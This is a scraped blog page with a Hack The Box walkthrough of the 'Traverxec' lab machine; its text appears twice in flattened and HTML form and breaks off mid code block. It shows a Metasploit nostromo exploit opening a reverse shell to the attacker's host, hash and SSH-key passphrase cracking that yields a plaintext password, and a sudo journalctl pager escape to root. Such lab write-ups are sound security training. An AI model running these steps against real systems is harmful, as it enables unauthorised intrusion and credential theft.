$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ Time.Started.....: Sat Dec 21 09:07:19 2019 (5 mins, 0 secs) Time.Estimated...: Sat Dec 21 09:12:19 2019 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 36494 H/s (6.67ms) @ Accel:256 Loops:125 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10776576/14344385 (75.13%) Rejected.........: 0/10776576 (0.00%) Restore.Point....: 10774528/14344385 (75.11%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000 Candidates.#1....: OBADIAH -&gt; Nov25th Started: Sat Dec 21 09:07:16 2019 Stopped: Sat Dec 21 09:12:20 2019 sshing as david did not work with david:Nowonly4me, so lets try taking a look at his home directory. 1 2 www-data@traverxec:/usr/bin$ ls /home/david ls: cannot open directory &#39;/home/david&#39;: Permission denied Kind of a deadend here so I scouted the forums for hints and many were saying to study the config of the nostromo service carefully. /var/nostromo/conf/nhttpd.conf: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www If we look at the documentation for the nostromo service, 1 2 3 4 5 HOMEDIRS To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example: http://www.nazgul.ch/~hacki/ ... Hmm… If we append ~ in front of david to the URL, we get http://traverxec.htb/~david. Nothing much here but we are getting somewhere. If we read more of the documentation, 1 2 3 HOMEDIRS ... You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option This means that the directory public_www must exist in the home directory of the users for this feature to work. Lets try browsing to /home/david/public_www. 1 2 3 www-data@traverxec:/home/david/public_www$ ls ls index.html protected-file-area What do we have here ? Inside the protected-file-area, we find a backup of ssh files. 1 2 www-data@traverxec:/home/david/public_www$ ls protected-file-area backup-ssh-identity-files.tgz Couldn’t find any curl or ftp on the machine to upload the files to us, so lets see if we can access the folder via the browser at http://traverxec.htb/~david/protected-file-area. We get prompted for authentication, keyed in david:Nowonly4me and we can now proceed to download the file. To extract the contents, we run tar on it. 1 2 3 4 5 $ tar -xvf backup-ssh-identity-files.tgz home/david/.ssh/ home/david/.ssh/authorized_keys home/david/.ssh/id_rsa home/david/.ssh/id_rsa.pub Lets see if we can ssh using the private ssh key. 1 2 $ ssh -i id_rsa david@traverxec.htb Enter passphrase for key &#39;id_rsa&#39;: Seems like we need a passphrase. Lets see if we can crack it with john. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ python ssh2john.py id_rsa &gt; david.hash $ john --wordlist=/usr/share/wordlists/rockyou.txt david.hash Created directory: /root/.john Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 8 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status hunter (id_rsa) Warning: Only 2 candidates left, minimum 8 needed for performance. 1g 0:00:00:02 DONE (2019-12-21 22:53) 0.4132g/s 5926Kp/s 5926Kc/s 5926KC/sa6_123..*7¡Vamos! Session completed user.txt With the passphrase, lets try sshing as david and retrieve the user flag. 1 2 3 4 5 6 $ ssh -i id_rsa david@traverxec.htb Enter passphrase for key &#39;id_rsa&#39;: Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 Last login: Wed Jan 1 02:54:14 2020 from 10.10.XX.XX david@traverxec:~$ cat user.txt 7db0XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (3) In david’s home directory , we see an interesting directory called bin. 1 2 3 4 david@traverxec:~$ ls bin public_www user.txt david@traverxec:~$ ls bin server-stats.head server-stats.sh server-stats.head contained an ASCII banner while server-stats.sh contained some commands. 1 2 3 4 5 6 7 8 9 10 11 david@traverxec:~$ cat bin/server-stats.sh #!/bin/bash cat /home/david/bin/server-stats.head echo &quot;Load: `/usr/bin/uptime`&quot; echo &quot; &quot; echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot; echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot; echo &quot; &quot; echo &quot;Last 5 journal log lines:&quot; /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat On the last line, we see a sudo command being ran. Running the sudo command with the journalctl command simply prints some logs to the screen. 1 2 3 4 5 6 7 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service -- Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:38:03 EST. -- Jan 01 02:50:20 traverxec nhttpd[458]: configuration has been reloaded Jan 01 03:11:32 traverxec nhttpd[810]: stopped Jan 01 03:13:22 traverxec nhttpd[458]: configuration has been reloaded Jan 01 03:20:37 traverxec crontab[1414]: (www-data) LIST (www-data) Jan 01 03:22:18 traverxec sudo[1420]: www-data : unknown user: #-1 According to journalctl’s entry in GTFOBins, we see that we are able to break out by spawning a shell by entering !/bin/sh. But where can we enter the command ? According to the man page of journalctl, the output is piped to less! 1 2 3 4 5 ... The output is paged through less by default, and long lines are &quot;truncated&quot; to screen width. The hidden part can be viewed by using the left-arrow and right-arrow keys. Paging can be disabled; see the --no-pager option and the &quot;Environment&quot; section below. ... less will only work as intended if the output is more than the capacity of the terminal screen, hence if we shrink the width of it and run the command again, 1 2 3 4 5 6 7 - Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:45:55 EST. -- Jan 01 03:22:18 traverxec sudo[1420]: www-data : unknown user: #-1 Jan 01 03:44:32 traverxec su[1670]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost= user=davi Jan 01 03:44:34 traverxec su[1670]: FAILED SU (to david) www-data on pts/9 Jan 01 03:45:04 traverxec su[1674]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost= user=davi Jan 01 03:45:05 traverxec su[1674]: FAILED SU (to david) www-data on pts/9 lines 1-6/6 (END) root.txt We get a somewhat incomplete output and by entering !/bin/sh, we get a shell as root! 1 2 3 4 5 !/bin/sh # whoami root # cat /root/root.txt 9aa3XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/traverxec-htb/","@type":"BlogPosting","headline":"Hack The Box - Traverxec","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-04-12T02:48:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Traverxec | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end">
<div class="profile-wrapper text-center">
<div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a>
</div>
<div class="site-title mt-3"> <a href="/">rizemon's blog</a>
</div>
<div class="site-subtitle font-italic">Cyber Security Enthusiast.</div>
</div>
<ul class="w-100">
<li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a>
</li>
</ul>
<div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href%20=%20'mailto:'%20+%20%5B'',''%5D.join('@')" aria-label="email" class="order-5"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6"> <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span>
</div>
</div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Traverxec</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div>
<i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel">Cancel</span>
</div></div><div id="main-wrapper">
<div id="main">
<div class="row">
<div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
<h1 data-toc-skip>Hack The Box - Traverxec</h1>
<div class="post-meta text-muted d-flex flex-column">
<div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 12, 2020, 2:48 AM +0800"> Apr 12, 2020 <i class="unloaded">2020-04-12T02:48:00+08:00</i> </span> by <span class="author"> rizemon </span>
</div>
<div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800"> Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1794 words">9 min</span>
</div>
</div>
<div class="post-content">
<p>This box was the last <code class="language-plaintext highlighter-rouge">Easy</code> box of the year 2019 and it has made me realise that I really have went a long way since the start of my journey in HackTheBox.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/traverxec.png" alt="" height="414px" width="615px"></p>
<h1 id="configuration">Configuration</h1>
<p>The operating systems that I will be using to tackle this machine is a Kali Linux VM.</p>
<p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.165 traverxec.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> traverxec.htb
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-12-21 04:12 EST
Nmap scan report <span class="k">for </span>traverxec.htb <span class="o">(</span>10.10.10.165<span class="o">)</span>
Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>32.82 seconds

</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="enumeration-1">Enumeration (1)</h1>
<p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="language-plaintext highlighter-rouge">http</code> service, maybe we can find some information on it ?</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/traverxec1.png" alt=""></p>
<p>Seems like an online portfolio? There aren’t any pages to visit but there was a form which submits to a <code class="language-plaintext highlighter-rouge">empty.html</code>, which contained nothing useful.</p>
<p>Lets see if we can find any exploits using <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>searchsploit nostromo
<span class="nt">--------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
 Exploit Title                                                            |  Path
                                                                          | <span class="o">(</span>/usr/share/exploitdb/<span class="o">)</span>
<span class="nt">--------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
Nostromo - Directory Traversal Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>      | exploits/multiple/remote/47573.rb
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution      | exploits/linux/remote/35466.sh
<span class="nt">--------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
Shellcodes: No Result
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="exploitation">Exploitation</h1>
<p>Awesome, lets use the Metasploit exploit to get a shell.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>msfconsole
msf5 <span class="o">&gt;</span> use exploit/multi/http/nostromo_code_exec
msf5 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.XX.XX
LHOST <span class="o">=&gt;</span> 10.10.XX.XX
msf5 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS traverxec.htb
RHOSTS <span class="o">=&gt;</span> traverxec.htb
msf5 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>ForceExploit <span class="nb">true
</span>ForceExploit <span class="o">=&gt;</span> <span class="nb">true
</span>msf5 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> <span class="o">&gt;</span> run 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.XX.XX:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Configuring Automatic <span class="o">(</span>Unix In-Memory<span class="o">)</span> target
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending cmd/unix/reverse_perl <span class="nb">command </span>payload
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.XX.XX:4444 -&gt; 10.10.10.165:37316<span class="o">)</span> at 2019-12-21 04:21:24 <span class="nt">-0500</span>

</pre></td>
</tr></tbody></table></code></div></div>
<p>There’s no prompt but lets try to upgrade to a <code class="language-plaintext highlighter-rouge">tty</code> shell.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
www-data@traverxec:/usr/bin<span class="err">$</span>
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="enumeration-2">Enumeration (2)</h1>
<p>Lets see if running <a href="https://github.com/rebootuser/LinEnum"><code class="language-plaintext highlighter-rouge">LinEnum</code></a> will give us any insights on how to carry on. I will be starting a web server on my machine using the builtin <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> module in <code class="language-plaintext highlighter-rouge">python</code> and use <code class="language-plaintext highlighter-rouge">wget</code> to retrieve it.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>httpserver
<span class="nv">$ </span><span class="nb">cd </span>httpserver
<span class="nv">$ </span><span class="nb">cp</span> ~/LinEnum.sh <span class="nb">.</span>
<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
</pre></td>
</tr></tbody></table></code></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td>
<td class="rouge-code"><pre>www-data@traverxec:/usr/bin<span class="nv">$ </span><span class="nb">cd</span> /tmp
www-data@traverxec:/tmp<span class="nv">$ </span>wget http://10.10.XX.XX/LinEnum.sh
<span class="nt">--2019-12-31</span> 09:22:23--  http://10.10.XX.XX/LinEnum.sh
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46476 <span class="o">(</span>45K<span class="o">)</span> <span class="o">[</span>text/x-sh]
Saving to: <span class="s1">'LinEnum.sh'</span>

LinEnum.sh          100%[<span class="o">===================&gt;]</span>  45.39K  59.2KB/s    <span class="k">in </span>0.8s    

2019-12-31 09:22:24 <span class="o">(</span>59.2 KB/s<span class="o">)</span> - <span class="s1">'LinEnum.sh'</span> saved <span class="o">[</span>46476/46476]

www-data@traverxec:/tmp<span class="nv">$ </span>
</pre></td>
</tr></tbody></table></code></div></div>
<p>Running <code class="language-plaintext highlighter-rouge">LinEnum.sh</code> shows that there is a username and a password hash in a <code class="language-plaintext highlighter-rouge">.htaccess</code> file.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td>
<td class="rouge-code"><pre>www-data@traverxec:/tmp<span class="nv">$ </span>./LinEnum.sh
...
<span class="o">[</span>-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
david:<span class="nv">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/
...
</pre></td>
</tr></tbody></table></code></div></div>
<p>To crack it, I will be using <code class="language-plaintext highlighter-rouge">hashcat</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>hashcat <span class="nt">-m</span> 500 <span class="nt">-a</span> 0 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
...
<span class="nv">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/:Nowonly4me    
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: md5crypt, MD5 <span class="o">(</span>Unix<span class="o">)</span>, Cisco-IOS <span class="nv">$1$ </span><span class="o">(</span>MD5<span class="o">)</span>
Hash.Target......: <span class="nv">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/
Time.Started.....: Sat Dec 21 09:07:19 2019 <span class="o">(</span>5 mins, 0 secs<span class="o">)</span>
Time.Estimated...: Sat Dec 21 09:12:19 2019 <span class="o">(</span>0 secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:    36494 H/s <span class="o">(</span>6.67ms<span class="o">)</span> @ Accel:256 Loops:125 Thr:1 Vec:8
Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Salts
Progress.........: 10776576/14344385 <span class="o">(</span>75.13%<span class="o">)</span>
Rejected.........: 0/10776576 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 10774528/14344385 <span class="o">(</span>75.11%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidates.#1....: OBADIAH -&gt; Nov25th

Started: Sat Dec 21 09:07:16 2019
Stopped: Sat Dec 21 09:12:20 2019
</pre></td>
</tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">ssh</code>ing as <code class="language-plaintext highlighter-rouge">david</code> did not work with <code class="language-plaintext highlighter-rouge">david:Nowonly4me</code>, so lets try taking a look at his home directory.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre>www-data@traverxec:/usr/bin<span class="nv">$ </span><span class="nb">ls</span> /home/david
<span class="nb">ls</span>: cannot open directory <span class="s1">'/home/david'</span>: Permission denied
</pre></td>
</tr></tbody></table></code></div></div>
<p>Kind of a deadend here so I scouted the forums for hints and many were saying to study the config of the <code class="language-plaintext highlighter-rouge">nostromo</code> service carefully.</p>
<p><code class="language-plaintext highlighter-rouge">/var/nostromo/conf/nhttpd.conf</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td>
